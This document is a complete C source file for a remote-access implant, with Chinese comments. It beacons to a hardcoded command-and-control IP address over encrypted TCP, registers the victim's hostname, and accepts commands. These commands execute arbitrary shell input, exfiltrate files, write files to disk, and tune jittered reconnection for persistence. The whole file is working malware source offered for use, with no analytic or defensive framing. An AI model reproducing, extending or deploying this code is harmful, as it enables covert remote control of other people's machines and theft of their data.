#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <sys/utsname.h>
#include <stdarg.h>
#include <time.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define BUF_SIZE 2097152
#define IV_LEN   12
#define TAG_LEN  16
/* ========== 编译时写死配置 ========== */
#define C2_IP       "45.77.118.169"   /* VPS IP地址 */
#define C2_PORT     443          /* 端口 */
#define C2_PASS     "c2_default_key_2024"  /* 密码 */
#define C2_MODE     1             /* 0=persist(长驻) 1=oneshot(单次) */
#define C2_RETRY    10            /* 重试次数 */
#define C2_RDELAY   30            /* 重试间隔秒 */
/* ==================================== */


static unsigned char g_key[32];
static int g_recon_min=30,g_recon_max=300;

/* Packet format:
 *   [4:outer_len(BE)]         <- total bytes after this field (IV + ciphertext + tag)
 *   [12:IV]
 *   [N:AES-256-GCM(4:inner_len(BE) + plaintext) + 16:tag]
 *
 * outer_len is outside the encryption (but if tampered, decrypt fails)
 * inner_len is inside the encryption (authenticated, cannot be tampered)
 */
static int pkt_enc(const unsigned char *p,int pl,unsigned char *o,int *ol){
    EVP_CIPHER_CTX *c=EVP_CIPHER_CTX_new();if(!c)return -1;
    unsigned char *iv=o+4;RAND_bytes(iv,IV_LEN);
    EVP_EncryptInit_ex(c,EVP_aes_256_gcm(),0,0,0);
    EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_IVLEN,IV_LEN,0);
    EVP_EncryptInit_ex(c,0,0,g_key,iv);

    /* encrypt: [4:inner_len][plaintext] */
    unsigned char inner[4];
    inner[0]=(pl>>24)&0xff;inner[1]=(pl>>16)&0xff;
    inner[2]=(pl>>8)&0xff;inner[3]=pl&0xff;

    unsigned char *ct=iv+IV_LEN;int l=0,cl=0;
    EVP_EncryptUpdate(c,ct,&l,inner,4);cl=l;
    EVP_EncryptUpdate(c,ct+cl,&l,p,pl);cl+=l;
    EVP_EncryptFinal_ex(c,ct+cl,&l);cl+=l;
    EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_GET_TAG,TAG_LEN,ct+cl);cl+=TAG_LEN;

    unsigned int t=IV_LEN+cl;
    o[0]=t>>24;o[1]=t>>16;o[2]=t>>8;o[3]=t;
    *ol=4+t;EVP_CIPHER_CTX_free(c);return 0;
}

static int pkt_dec(const unsigned char *in,int il,unsigned char *out,int *ol){
    if(il<IV_LEN+TAG_LEN+1)return -1;
    const unsigned char *iv=in,*ct=iv+IV_LEN;
    int cl=il-IV_LEN-TAG_LEN;
    EVP_CIPHER_CTX *c=EVP_CIPHER_CTX_new();if(!c)return -1;
    EVP_DecryptInit_ex(c,EVP_aes_256_gcm(),0,0,0);
    EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_IVLEN,IV_LEN,0);
    EVP_DecryptInit_ex(c,0,0,g_key,iv);
    int l=0,pt=0;
    EVP_DecryptUpdate(c,out,&l,ct,cl);pt=l;
    unsigned char tag[TAG_LEN];memcpy(tag,ct+cl,TAG_LEN);
    if(!EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_TAG,TAG_LEN,tag)){EVP_CIPHER_CTX_free(c);return -2;}
    if(EVP_DecryptFinal_ex(c,out+pt,&l)<=0){EVP_CIPHER_CTX_free(c);return -2;}
    pt+=l;
    /* first 4 bytes are inner_len */
    if(pt<4){EVP_CIPHER_CTX_free(c);return -1;}
    unsigned int inner=(out[0]<<24)|(out[1]<<16)|(out[2]<<8)|out[3];
    if(inner>(unsigned int)(pt-4)){EVP_CIPHER_CTX_free(c);return -1;}
    memmove(out,out+4,inner);out[inner]=0;*ol=inner;
    EVP_CIPHER_CTX_free(c);return 0;
}

static int read_all(int fd,unsigned char *b,int n){
    int p=0;while(p<n){int r=read(fd,b+p,n-p);if(r<=0)return -1;p+=r;}return 0;
}

static int recv_pkt(int fd,unsigned char *pb,int bm,unsigned char *pl,int *plen){
    unsigned char h[4];if(read_all(fd,h,4)<0)return -1;
    unsigned int t=(h[0]<<24)|(h[1]<<16)|(h[2]<<8)|h[3];
    if(t<IV_LEN+TAG_LEN||t>(unsigned int)bm)return -1;
    if(read_all(fd,pb,t)<0)return -1;
    return pkt_dec(pb,t,pl,plen);
}

static int send_pkt(int fd,const unsigned char *p,int pl){
    unsigned char *b=malloc(pl+IV_LEN+TAG_LEN+64);if(!b)return -1;
    int bl=0;if(pkt_enc(p,pl,b,&bl)<0){free(b);return -1;}
    int n=write(fd,b,bl);free(b);return(n==bl)?0:-1;
}

static void b64_resp(int fd,const char *t){
    /* Send as: OK 0 <base64> so server can parse it */
    int tl=strlen(t);if(!tl){send_pkt(fd,(unsigned char*)"OK 0 ",5);return;}
    static const unsigned char b64t[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int bl=(tl+2)/3*4;char *b=malloc(bl+6);if(!b){send_pkt(fd,(unsigned char*)t,tl);return;}
    memcpy(b,"OK 0 ",5);int i,j=5;for(i=0;i<tl;i+=3){
        unsigned int a=(unsigned char)t[i],b0=(i+1<tl)?(unsigned char)t[i+1]:0,c0=(i+2<tl)?(unsigned char)t[i+2]:0;
        b[j++]=b64t[a>>2];b[j++]=b64t[((a&3)<<4)|(b0>>4)];
        b[j++]=(i+1<tl)?b64t[((b0&15)<<2)|(c0>>6)]:'=';
        b[j++]=(i+2<tl)?b64t[c0&63]:'=';
    }b[j]=0;send_pkt(fd,(unsigned char*)b,j);free(b);
}

static int rd_file(const char *p,char **o,int *ol){
    FILE *f=fopen(p,"rb");if(!f)return -1;
    fseek(f,0,SEEK_END);long sz=ftell(f);rewind(f);
    if(sz>1048576){fclose(f);return -2;}
    *o=malloc(sz+1);if(!*o){fclose(f);return -1;}
    *ol=fread(*o,1,sz,f);fclose(f);(*o)[*ol]=0;return 0;
}

static int wr_file(const char *p,const unsigned char *d,int l){
    FILE *f=fopen(p,"wb");if(!f)return -1;
    int r=fwrite(d,1,l,f);fclose(f);return r;
}

static char *run_cmd(const char *c,int *ol){
    char f[8192];snprintf(f,sizeof(f),"%s 2>&1",c);
    FILE *fp=popen(f,"r");if(!fp)return NULL;
    char *b=malloc(BUF_SIZE);if(!b){pclose(fp);return NULL;}
    int p=0,n;while((n=fread(b+p,1,BUF_SIZE-p-1,fp))>0)p+=n;
    b[p]=0;*ol=p;pclose(fp);return b;
}

static void derive_key(const char *p){
    EVP_MD_CTX *c=EVP_MD_CTX_new();
    EVP_DigestInit_ex(c,EVP_sha256(),0);
    EVP_DigestUpdate(c,p,strlen(p));
    EVP_DigestFinal_ex(c,g_key,0);
    EVP_MD_CTX_free(c);
}

static void exec_cmd(int sock,const char *cmd){
    if(strncmp(cmd,"shell ",6)==0){
        int ol=0;char *o=run_cmd(cmd+6,&ol);
        if(o){b64_resp(sock,o);free(o);}else send_pkt(sock,(unsigned char*)"ERR fail",8);
    } else if(strncmp(cmd,"get ",4)==0){
        char *fd=0;int fl=0;int r=rd_file(cmd+4,&fd,&fl);
        if(r==-1)send_pkt(sock,(unsigned char*)"ERR open",8);
        else if(r==-2)send_pkt(sock,(unsigned char*)"ERR large",9);
        else{
            static const unsigned char b64t[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            int bl=(fl+2)/3*4;char *b=malloc(bl+1);
            if(b){int i,j=0;for(i=0;i<fl;i+=3){
                unsigned int a=(unsigned char)fd[i],b0=(i+1<fl)?(unsigned char)fd[i+1]:0,c0=(i+2<fl)?(unsigned char)fd[i+2]:0;
                b[j++]=b64t[a>>2];b[j++]=b64t[((a&3)<<4)|(b0>>4)];
                b[j++]=(i+1<fl)?b64t[((b0&15)<<2)|(c0>>6)]:'=';b[j++]=(i+2<fl)?b64t[c0&63]:'=';
            }b[j]=0;char *r2=malloc(6+strlen(b));if(r2){sprintf(r2,"FILE %s",b);send_pkt(sock,(unsigned char*)r2,strlen(r2));free(r2);}free(b);}
            free(fd);
        }
    } else if(strncmp(cmd,"put ",4)==0){
        const char *rest=cmd+4,*pe=strchr(rest,' ');
        if(!pe)send_pkt(sock,(unsigned char*)"ERR bad fmt",11);
        else{int pl=pe-rest;char path[1024];memcpy(path,rest,pl);path[pl]=0;
            const char *b64=pe+1;unsigned char *dec=malloc(strlen(b64));
            static const signed char b64d[]={-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1};
            int i=0,j=0,l=strlen(b64),dlen=-1;
            while(i<l&&b64[i]!='='){
                unsigned int a=b64d[(unsigned char)b64[i]],b1=b64d[(unsigned char)b64[i+1]],c1=b64d[(unsigned char)b64[i+2]],d1=b64d[(unsigned char)b64[i+3]];
                if(a>63||b1>63){dlen=-1;break;}dec[j++]=(a<<2)|(b1>>4);
                if(c1<64){dec[j++]=((b1&15)<<4)|(c1>>2);if(d1<64)dec[j++]=((c1&3)<<6)|d1;}
                i+=4;
            }dlen=j;
            if(dlen<0)send_pkt(sock,(unsigned char*)"ERR b64",7);
            else{int w=wr_file(path,dec,dlen);if(w<0)send_pkt(sock,(unsigned char*)"ERR write",9);else b64_resp(sock,"written");}
            free(dec);
        }
    } else if(strncmp(cmd,"sleep ",6)==0){
        int s=atoi(cmd+6);if(s>0&&s<=3600){sleep(s);char m[64];snprintf(m,64,"slept %ds",s);b64_resp(sock,m);}
        else send_pkt(sock,(unsigned char*)"ERR sleep",9);
    } else if(strncmp(cmd,"set_beacon ",11)==0){
        int a,b;if(sscanf(cmd+11,"%d %d",&a,&b)==2&&a>=5&&b<=3600&&b>=a){g_recon_min=a;g_recon_max=b;char m[64];snprintf(m,64,"beacon %d-%d",a,b);b64_resp(sock,m);}
        else send_pkt(sock,(unsigned char*)"ERR set_beacon min max",22);
    } else if(strcmp(cmd,"exit")==0){b64_resp(sock,"bye");}
    else if(strcmp(cmd,"ping")==0){b64_resp(sock,"pong");}
    else send_pkt(sock,(unsigned char*)"ERR unknown",11);
}

int main(int argc,char *argv[]){
    const char *srv_ip=argc>1?argv[1]:C2_IP;
    int srv_port=argc>2?atoi(argv[2]):C2_PORT;
    const char *pass=argc>3?argv[3]:C2_PASS;
    int mode=C2_MODE;
    int retry_cnt=C2_RETRY,retry_delay=C2_RDELAY;

    if(argc>4){
        if(strcmp(argv[4],"oneshot")==0||strcmp(argv[4],"0")==0){
            mode=1;
            if(argc>5)retry_cnt=atoi(argv[5]);
            if(argc>6)retry_delay=atoi(argv[6]);
            if(retry_cnt<1)retry_cnt=1;
            if(retry_cnt>100)retry_cnt=100;
            if(retry_delay<5)retry_delay=5;
            if(retry_delay>300)retry_delay=300;
        } else {
            g_recon_min=atoi(argv[4]);
            if(argc>5){g_recon_max=atoi(argv[5]);if(g_recon_max<g_recon_min)g_recon_max=g_recon_min+60;}
        }
    }

    derive_key(pass);srand(time(NULL)^getpid());
    struct utsname un;uname(&un);
    unsigned char *pb=malloc(IV_LEN+TAG_LEN+BUF_SIZE+128);
    unsigned char *pl=malloc(BUF_SIZE);
    if(!pb||!pl)return 1;

    do{
        int sock=-1,i;
        if(mode==1){
            for(i=0;i<retry_cnt;i++){
                sock=socket(AF_INET,SOCK_STREAM,0);
                if(sock<0){sleep(retry_delay);continue;}
                struct sockaddr_in a;memset(&a,0,sizeof(a));
                a.sin_family=AF_INET;a.sin_port=htons(srv_port);
                a.sin_addr.s_addr=inet_addr(srv_ip);
                if(connect(sock,(struct sockaddr*)&a,sizeof(a))==0)break;
                close(sock);sock=-1;
                if(i<retry_cnt-1)sleep(retry_delay);
            }
            if(sock<0)return 0;
        } else {
            sock=socket(AF_INET,SOCK_STREAM,0);
            if(sock<0){sleep(g_recon_min);continue;}
            struct sockaddr_in a;memset(&a,0,sizeof(a));
            a.sin_family=AF_INET;a.sin_port=htons(srv_port);
            a.sin_addr.s_addr=inet_addr(srv_ip);
            if(connect(sock,(struct sockaddr*)&a,sizeof(a))<0){
                close(sock);int d=g_recon_min;
                if(g_recon_max>g_recon_min)d+=rand()%(g_recon_max-g_recon_min+1);
                sleep(d);continue;
            }
        }

        struct timeval tv={600,0};
        setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
        /* TCP keepalive — prevent NAT/firewall from dropping idle conns */
        int keepalive=1;
        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,&keepalive,sizeof(keepalive));
        int idle=30;    /* 30s idle before probes */
        int interval=10; /* 10s between probes */
        int count=3;     /* 3 failures = dead */
        setsockopt(sock,SOL_TCP,TCP_KEEPIDLE,&idle,sizeof(idle));
        setsockopt(sock,SOL_TCP,TCP_KEEPINTVL,&interval,sizeof(interval));
        setsockopt(sock,SOL_TCP,TCP_KEEPCNT,&count,sizeof(count));
        char reg[256];snprintf(reg,256,"REG %s/%s",un.nodename,mode==1?"oneshot":"persist");
        send_pkt(sock,(unsigned char*)reg,strlen(reg));

        while(1){
            int plen=0,rc=recv_pkt(sock,pb,IV_LEN+TAG_LEN+BUF_SIZE+128,pl,&plen);
            if(rc<0)break;
            exec_cmd(sock,(char*)pl);
            if(strcmp((char*)pl,"exit")==0)break;
        }
        close(sock);
        if(mode==1)break;
        int d=g_recon_min;if(g_recon_max>g_recon_min)d+=rand()%(g_recon_max-g_recon_min+1);
        sleep(d);
    }while(mode==0);

    free(pb);free(pl);
    return 0;
}
